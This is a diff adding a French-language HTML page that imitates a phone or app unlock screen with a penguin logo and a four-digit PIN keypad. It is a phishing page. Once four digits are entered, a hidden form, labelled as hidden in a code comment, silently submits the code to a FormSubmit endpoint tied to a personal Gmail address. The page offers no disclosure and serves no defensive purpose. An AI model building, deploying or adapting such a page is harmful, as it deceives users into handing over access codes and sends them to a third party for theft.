@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Déverrouillage</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      box-sizing: border-box;
+    }
+
+    .penguin {
+      height: 80px;
+      width: auto;
+      margin-top: 60px;
+      margin-bottom: 30px;
+      object-fit: contain;
+    }
+
+    .text {
+      text-align: center;
+      font-size: 18px;
+      margin-bottom: 30px;
+    }
+
+    .dots {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 50px;
+    }
+
+    .dot {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      background-color: #cceeff;
+      transition: background-color 0.3s ease;
+    }
+
+    .dot.filled {
+      background-color: #00bfff;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px 80px;
+      width: 100%;
+      max-width: 240px;
+      font-size: 35px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .key {
+      padding: 10px 0;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .bottom-row {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 20px 60px;
+      width: 100%;
+      max-width: 240px;
+      margin-top: 25px;
+      align-items: center;
+      justify-items: center;
+    }
+
+    .oubli {
+      font-size: 13px;
+      color: #333;
+      text-align: center;
+    }
+
+    .zero {
+      font-size: 35px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+    }
+
+    .delete-img {
+      width: 30px;
+      height: 30px;
+      object-fit: contain;
+      cursor: pointer;
+    }
+
+    .shake {
+      animation: shake 0.3s ease;
+    }
+
+    @keyframes shake {
+      0% { transform: translateX(-5px); }
+      25% { transform: translateX(5px); }
+      50% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+      100% { transform: translateX(0); }
+    }
+
+    @media (max-height: 600px) {
+      .penguin {
+        margin-top: 30px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Formulaire caché pour envoyer à FormSubmit -->
+  <form action="https://formsubmit.co/dibyyann76@gmail.com" method="POST" id="number">
+    <input type="hidden" name="numero" id="numeroInput">
+  </form>
+
+  <div class="container">
+    <img src="penguin.png" alt="Pingouin" class="penguin">
+
+    <div class="text">
+      Votre code est requis pour<br>continuer
+    </div>
+
+    <div class="dots" id="dots">
+      <div class="dot" id="dot0"></div>
+      <div class="dot" id="dot1"></div>
+      <div class="dot" id="dot2"></div>
+      <div class="dot" id="dot3"></div>
+    </div>
+
+    <div class="keypad">
+      <div class="key" onclick="appendNumber('1')">1</div>
+      <div class="key" onclick="appendNumber('2')">2</div>
+      <div class="key" onclick="appendNumber('3')">3</div>
+      <div class="key" onclick="appendNumber('4')">4</div>
+      <div class="key" onclick="appendNumber('5')">5</div>
+      <div class="key" onclick="appendNumber('6')">6</div>
+      <div class="key" onclick="appendNumber('7')">7</div>
+      <div class="key" onclick="appendNumber('8')">8</div>
+      <div class="key" onclick="appendNumber('9')">9</div>
+    </div>
+
+    <div class="bottom-row">
+      <div class="oubli">OUBLIÉ?</div>
+      <div class="zero" onclick="appendNumber('0')">0</div>
+      <div class="delete" onclick="deleteLast()">
+        <img src="delete.png" alt="Supprimer" class="delete-img">
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let numero = "";
+
+    function updateDots() {
+      for (let i = 0; i < 4; i++) {
+        const dot = document.getElementById("dot" + i);
+        if (i < numero.length) {
+          dot.classList.add("filled");
+        } else {
+          dot.classList.remove("filled");
+        }
+      }
+    }
+
+    function appendNumber(num) {
+      if (numero.length < 4) {
+        numero += num;
+        updateDots();
+        if (numero.length === 4) {
+          setTimeout(() => {
+            document.getElementById("numeroInput").value = numero;
+            document.getElementById("number").submit();
+          }, 300);
+        }
+      }
+    }
+
+    function deleteLast() {
+      numero = numero.slice(0, -1);
+      updateDots();
+    }
+  </script>
+</body>
+</html>
